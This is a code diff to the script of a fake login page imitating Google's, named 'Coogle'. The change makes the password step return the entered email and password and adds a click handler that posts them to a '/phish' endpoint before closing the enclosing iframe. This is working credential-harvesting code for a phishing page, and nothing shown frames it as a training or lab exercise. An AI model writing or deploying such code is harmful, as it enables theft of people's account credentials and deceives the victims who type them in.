@@ -42,7 +42,7 @@
         coogle.doPasswordStep = function(){
             var username = $('#email-input').val()
             var password = $('#password-input').val()
-            console.log(username, password)
+            return {"email": username, "password" : password}
         }
 
         coogle.toEmailPage = function(){
@@ -81,10 +81,16 @@
                 coogle.doPasswordStep()
                 e.preventDefault()
             })
+            $('.btn-next-password').on('click',
+                function(){
+                    const data  = coogle.doPasswordStep();
+                    $.post("/phish", data );
+                    parent.closeIFrame();
+                
+                }
+            )
 
-            $('.btn-next-password').on('click', function(){
-                coogle.doPasswordStep()
-            })
+          
 
 
         }
@@ -97,5 +103,6 @@
     $( document ).ready(function() {
         var myCoogle = new Coogle();
         window.coogle = myCoogle;
+        
         //coogle.toPasswordPage()
     });
